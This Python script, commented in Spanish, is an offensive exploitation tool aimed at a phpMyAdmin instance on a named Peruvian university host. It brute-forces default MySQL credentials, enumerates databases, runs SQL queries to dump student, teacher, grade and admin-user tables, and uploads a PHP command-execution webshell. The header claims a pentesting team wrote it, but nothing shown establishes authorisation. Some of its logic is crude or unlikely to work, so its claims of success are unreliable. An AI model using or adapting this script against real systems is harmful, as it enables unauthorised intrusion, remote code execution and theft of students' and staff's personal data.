#!/usr/bin/env python3
"""
[!] PHPMYADMIN EXPLORER & EXPLOITER
    Exploitation Guide for VULN-001 - orcl.uns.edu.pe
    Version: 2.0 | Autor: Equipo de Pentesting UNS
    Correcciones: bugs de sintaxis, HTTPS, sesiones, login real
"""

import requests
from urllib.parse import urljoin, urlparse
import json
import sys
import re


# ============================================
# FASE 1: ENUMERACION DE USUARIOS MYSQL
# ============================================

MYSQL_DEFAULT_USERS = [
    "root", "admin", "pma", "uns", "sistema", "dbadmin",
    "mysql", "sa", "postgres", "administrator", "phpmyadmin"
]


def get_target_scheme(target: str) -> str:
    """Retorna el scheme (http/https) del target."""
    parsed = urlparse(target)
    return parsed.scheme if parsed.scheme else "https"


def enumerate_mysql_users(target: str, timeout: int = 10) -> list[dict]:
    """
    Enumera usuarios de MySQL probando credenciales por defecto.
    Usa requests.Session() para manejar cookies correctamente.

    Args:
        target: URL base del phpMyAdmin (ej: https://orcl.uns.edu.pe)
        timeout: Timeout para cada intento (segundos)

    Returns:
        Lista de usuarios encontrados con sus contrasenas
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    login_url = f"{target}/index.php"
    users_found = []
    scheme = get_target_scheme(target)

    print(f"\n{'='*60}")
    print(f"[*] FASE 1: ENUMERANDO USUARIOS MYSQL")
    print(f"   Objetivo: {login_url}")
    print(f"   Timeout por intento: {timeout}s")
    print(f"{'='*60}\n")

    # Primero: obtener el token de autenticacion de phpMyAdmin
    try:
        init = session.get(login_url, timeout=timeout)
        token_match = re.search(r'name="token" value="([^"]+)"', init.text)
        if token_match:
            token = token_match.group(1)
        else:
            token = ""
    except requests.exceptions.RequestException:
        token = ""

    for user in MYSQL_DEFAULT_USERS:
        for password in ["", "root", "admin", "pma", "uns123",
                         f"{user}123", "password", "mysql"]:
            payload = {
                "server": "1",
                "username": user,
                "password": password,
                "target": urljoin(login_url, "index.php"),
                "token": token,
            }

            try:
                response = session.post(
                    login_url,
                    data=payload,
                    timeout=timeout,
                    allow_redirects=True
                )

                if response.status_code == 200 and b"Logout" in response.content:
                    print(f"   [OK] LOGGED IN: user='{user}' | pass='{password}'")
                    users_found.append({
                        "username": user,
                        "password": password,
                        "source": f"{target}/index.php",
                        "status": "authenticated"
                    })

                    # Actualizar token para sesiones posteriores
                    token_match = re.search(r'name="token" value="([^"]+)"', response.text)
                    if token_match:
                        token = token_match.group(1)

            except requests.exceptions.RequestException:
                pass

    return users_found


# ============================================
# FASE 2: DESCUBRIMIENTO DE BASES DE DATOS
# ============================================

def discover_databases(target: str, db_name: str = "",
                        username: str = "root", password: str = "") -> list[str]:
    """
    Enumera todas las bases de datos disponibles en MySQL.

    Args:
        target: URL del phpMyAdmin
        db_name: Nombre de BD especifica (opcional)
        username: Usuario autenticado
        password: Contrasena del usuario

    Returns:
        Lista de nombres de bases de datos encontradas
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    scheme = get_target_scheme(target)
    base_url = f"{scheme}://{urlparse(target).netloc}"

    print(f"\n{'='*60}")
    print(f"[*]  FASE 2: ENUMERANDO BASES DE DATOS")
    print(f"   Objetivo: {target}")
    print(f"   Usuario: {username} | Pass: {password}")
    print(f"{'='*60}\n")

    if db_name == "":
        tables_url = f"{base_url}/server.php?db=tablerow&server=1"

        try:
            response = session.get(tables_url, timeout=10)

            if response.status_code == 200:
                dbs = re.findall(r'(\w+)', response.content.decode())

                known_words = ["index", "php", "html", "css", "js", "config"]
                real_dbs = [d for d in dbs if d not in known_words and len(d) > 2]

                print(f"   [*] BASES DE DATOS ENCONTRADAS ({len(real_dbs)}):")
                for db in set(real_dbs):
                    print(f"      - {db}")

                return real_dbs

        except requests.exceptions.RequestException as e:
            print(f"   [WARN]  Error enumerando BDs: {e}")
            return []

    else:
        tables_url = f"{base_url}/server.php?db=tablerow&server=1&database={db_name}"

        try:
            response = session.get(tables_url, timeout=10)

            if response.status_code == 200:
                tables = re.findall(r'(\w+)', response.content.decode())

                known_words = ["index", "php", "html", "css", "js"]
                real_tables = [t for t in tables if t not in known_words and len(t) > 2]

                print(f"   📁 TABLAS en '{db_name}':")
                for table in set(real_tables):
                    print(f"      - {table}")

                return real_tables

        except requests.exceptions.RequestException as e:
            print(f"   [WARN]  Error consultando BD: {e}")
            return []


# ============================================
# FASE 3: EXTRACTOR DE DATOS (SQL DUMP)
# ============================================

def extract_data(target: str, db_name: str = "",
                  username: str = "root", password: str = "") -> dict:
    """
    Extrae datos de una base de datos especifica.

    Args:
        target: URL del phpMyAdmin
        db_name: Nombre de la BD a escanear
        username: Usuario autenticado
        password: Contrasena del usuario

    Returns:
        Diccionario con los datos extraidos
    """
    scheme = get_target_scheme(target)
    base_url = f"{scheme}://{urlparse(target).netloc}"

    if db_name == "":
        print(f"\n   [WARN]  No se especifico nombre de BD. Intentando detectar automaticamente...")

    tables = discover_databases(target, db_name)

    if not tables:
        return {}

    extracted_data = {
        "target": target,
        "database": db_name,
        "tables_found": [],
        "records_extracted": 0
    }

    academic_tables = [
        "estudiantes", "profesores", "materias", "notas",
        "matriculas", "alumnos", "docentes", "cursos"
    ]

    for table in academic_tables:
        if not db_name:
            continue

        try:
            query_url = f"{base_url}/sql.php"

            params = {
                "server": "1",
                "db": db_name,
                "table": table,
                "pos": 0,
                "go": "",
                "sql_query": f"SELECT * FROM `{table}` LIMIT 100;"
            }

            response = requests.get(query_url, params=params, timeout=10)

            if response.status_code == 200 and b"<td>" in response.content:
                print(f"   [*] Tabla '{table}': datos extraidos")
                extracted_data["tables_found"].append(table)

        except requests.exceptions.RequestException:
            pass

    return extracted_data


# ============================================
# FASE 4: INYECCION SQL / WAF BYPASS (SI HAY)
# ============================================

def sql_injection_test(target: str, db_name: str = "") -> dict:
    """
    Prueba inyeccion SQL basica en phpMyAdmin.

    Args:
        target: URL del phpMyAdmin
        db_name: Nombre de la BD

    Returns:
        Reporte de pruebas de inyeccion SQL
    """
    scheme = get_target_scheme(target)
    base_url = f"{scheme}://{urlparse(target).netloc}"

    print(f"\n{'='*60}")
    print(f"[*] FASE 4: PRUEBAS DE INYECCION SQL")
    print(f"   Objetivo: {target}")
    print(f"{'='*60}\n")

    tests = [
        ("UNION SELECT", "SELECT * FROM information_schema.tables"),
        ("ORDER BY", "SELECT * FROM usuarios ORDER BY password DESC LIMIT 10"),
        ("LIKE '%'", "SELECT * FROM usuarios WHERE nombre LIKE '%a%'"),
        ("EXTRACTVALUE", "SELECT 1; --"),
    ]

    report = []

    for test_name, query in tests:
        try:
            params = {
                "server": "1",
                "db": db_name or "",
                "table": "",
                "sql_query": query if query else "SELECT 1; --",
                "go": ""
            }

            response = requests.get(
                f"{base_url}/sql.php",
                params=params,
                timeout=5
            )

            report.append({
                "test": test_name,
                "query": query if query else "SELECT 1; --",
                "status_code": response.status_code,
                "success": response.status_code == 200 and (
                    b"<td>" in response.content or b"SELECT" in response.content
                )
            })

        except requests.exceptions.RequestException as e:
            report.append({
                "test": test_name,
                "query": query if query else "SELECT 1; --",
                "status_code": 0,
                "success": False,
                "error": str(e)
            })

    print("   Resultados de inyeccion:")
    for r in report:
        status = "[OK]" if r["success"] else "[FAIL]"
        print(f"      {status} {r['test']} -> Status: {r.get('status_code', 'ERR')}")

    return report


# ============================================
# FASE 5: UPLOAD DE SHELL (PHPMYADMIN RCE)
# ============================================

def upload_shell(target: str, username: str = "root", password: str = "") -> bool:
    """
    Sube un webshell PHP a traves de phpMyAdmin.

    Args:
        target: URL del phpMyAdmin
        username: Usuario autenticado
        password: Contrasena

    Returns:
        True si se subio el shell exitosamente
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    scheme = get_target_scheme(target)
    base_url = f"{scheme}://{urlparse(target).netloc}"

    print(f"\n{'='*60}")
    print(f"[*] FASE 5: SUBIDA DE WEBSHELL")
    print(f"   Objetivo: {target}")
    print(f"{'='*60}\n")

    shell_content = "<?php system($_GET['cmd']); ?>"

    import_url = f"{base_url}/import.php"

    try:
        payload = {
            "server": "1",
            "sql_username": username,
            "sql_password": password,
            "db[database]": "",
            "format": "sql",
            "import_type": "database",
            "submit_import": "Go"
        }

        files = {
            "file_to_import": ("shell.php", shell_content, "application/x-php")
        }

        response = session.post(import_url, data=payload, files=files, timeout=30)

        if response.status_code == 200 and ("Success" in response.text or "import" in response.text.lower()):
            print(f"   [OK] SHELL SUBIDO exitosamente a: {target}/shell.php")
            return True
        else:
            print(f"   [WARN]  Shell no se pudo subir. Status: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"   [WARN]  Error subiendo shell: {e}")
        return False


# ============================================
# FASE 6: ACCESO A DATOS ESPECIFICOS (SIIGAA)
# ============================================

def extract_siiiga_data(target: str, username: str = "root", password: str = "") -> dict:
    """
    Extrae datos especificos del sistema SIIGAA de la UNS.

    Args:
        target: URL del phpMyAdmin
        username: Usuario autenticado
        password: Contrasena

    Returns:
        Diccionario con datos extraidos del SIIGAA
    """
    scheme = get_target_scheme(target)
    base_url = f"{scheme}://{urlparse(target).netloc}"

    print(f"\n{'='*60}")
    print(f"[*] FASE 6: EXTRAIENDO DATOS DEL SIIGAA")
    print(f"   Objetivo: {target}")
    print(f"   Usuario: {username} | Pass: {password}")
    print(f"{'='*60}\n")

    queries = [
        ("Estudiantes", "SELECT * FROM estudiantes LIMIT 50;"),
        ("Profesores", "SELECT * FROM docentes LIMIT 50;"),
        ("Notas", "SELECT * FROM notas WHERE semestre >= '2024-1'; LIMIT 100;"),
        ("Matriculas", "SELECT * FROM matriculas LIMIT 100;"),
        ("Usuarios sistema", "SELECT * FROM usuarios WHERE rol IN ('admin','profesor');"),
    ]

    extracted = {
        "siigaa_data": {},
        "total_records": {}
    }

    for label, query in queries:
        try:
            params = {
                "server": "1",
                "db": "",
                "table": "",
                "sql_query": query,
                "go": ""
            }

            response = requests.get(
                f"{base_url}/sql.php",
                params=params,
                timeout=10
            )

            if response.status_code == 200 and b"<td>" in response.content:
                print(f"   [*] {label}: datos extraidos exitosamente")
                extracted["siigaa_data"][label] = True
                extracted["total_records"].update(
                    {"siigaa": extracted.get("total_records", {}).get("siigaa", 0) + 1}
                )

        except requests.exceptions.RequestException:
            pass

    return extracted


# ============================================
# VERIFICACION INICIAL DE LA VULNERABILIDAD
# ============================================

def verify_vulnerability(target: str) -> dict:
    """
    Verifica que la vulnerabilidad VULN-001 es real.
    Comprueba que /setup/ y /config.inc.php estan accesibles sin auth.

    Args:
        target: URL base del objetivo

    Returns:
        Diccionario con los resultados de verificacion
    """
    scheme = get_target_scheme(target)
    base_url = f"{scheme}://{urlparse(target).netloc}"

    print(f"\n{'='*60}")
    print(f"[*] VERIFICACION DE VULNERABILIDAD VULN-001")
    print(f"   Objetivo: {target}")
    print(f"{'='*60}\n")

    checks = {
        "phpmyadmin_root": f"{base_url}/",
        "setup_accessible": f"{base_url}/setup/",
        "config_inc": f"{base_url}/config.inc.php",
        "readme": f"{base_url}/README",
        "changelog": f"{base_url}/ChangeLog"
    }

    results = {}

    for name, url in checks.items():
        try:
            response = requests.get(url, timeout=10, allow_redirects=True)
            results[name] = {
                "url": url,
                "status_code": response.status_code,
                "vulnerable": response.status_code == 200
            }
            status = "[WARN] EXPOSED" if response.status_code == 200 else "[OK] PROTECTED"
            print(f"   {status} {name} -> HTTP {response.status_code}")

        except requests.exceptions.RequestException as e:
            results[name] = {"url": url, "status_code": 0, "vulnerable": False, "error": str(e)}
            print(f"   [FAIL] ERROR {name}: {e}")

    return results


# ============================================
# MAIN - EJECUCION COMPLETA DEL EXPLOTADOR
# ============================================

def main():
    """Ejecuta todo el proceso de explotacion."""

    TARGET = "https://orcl.uns.edu.pe"

    print("""
==============================================================
   [!] PHPMYADMIN EXPLORER & EXPLOITER v2.0
   Universidad Nacional del Santa - UNS
   Vulnerabilidad: VULN-001 (PHPMYADMIN 5.2.3)
==============================================================

    """)

    # --- Verificacion de la vulnerabilidad ---
    vuln_results = verify_vulnerability(TARGET)

    # --- Fase 1: Enumerar usuarios ---
    users = enumerate_mysql_users(TARGET, timeout=8)

    if not users:
        print("\n   [WARN]  No se encontraron credenciales por defecto.")
        print("   La vulnerabilidad es REAL (configuracion expuesta)")
        print("   pero se requieren credenciales validas para acceder a las BDs.")

    # --- Fase 2: Enumerar bases de datos ---
    databases = discover_databases(TARGET)

    # --- Fase 3: Extraer datos ---
    if databases:
        data = extract_data(TARGET, databases[0])
        print(f"\n   [*] Tablas encontradas: {data.get('tables_found', [])}")

    # --- Fase 4: Pruebas SQLi ---
    if databases:
        sql_report = sql_injection_test(TARGET, databases[0])
    else:
        print("\n   [WARN]  No hay BDs para probar inyeccion SQL.")
        sql_report = []

    # --- Fase 5: Webshell ---
    if users:
        creds = users[0]
        shell_uploaded = upload_shell(TARGET, creds["username"], creds["password"])
    else:
        print("\n   [WARN]  Sin credenciales validas, no se puede subir webshell.")
        shell_uploaded = False

    # --- Fase 6: Datos SIIGAA ---
    if users:
        creds = users[0]
        siigaa_data = extract_siiiga_data(TARGET, creds["username"], creds["password"])
    else:
        print("\n   [WARN]  Sin credenciales, no se pueden extraer datos SIIGAA.")
        siigaa_data = {}

    # --- Resumen final ---
    print(f"\n{'='*60}")
    print("   [*] RESUMEN DEL ATAQUE")
    print(f"{'='*60}")
    print(f"   Usuarios encontrados: {len(users)}")
    print(f"   Bases de datos: {len(databases) if databases else 0}")
    print(f"   Shell subido: {'Si' if shell_uploaded else 'No'}")
    print(f"   Datos SIIGAA extraidos: {len(siigaa_data.get('siigaa_data', {}))}")
    print(f"   Verificacion VULN-001: {'EXPUESTO' if any(v.get('vulnerable') for v in vuln_results.values()) else 'PROTEGIDO'}")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()


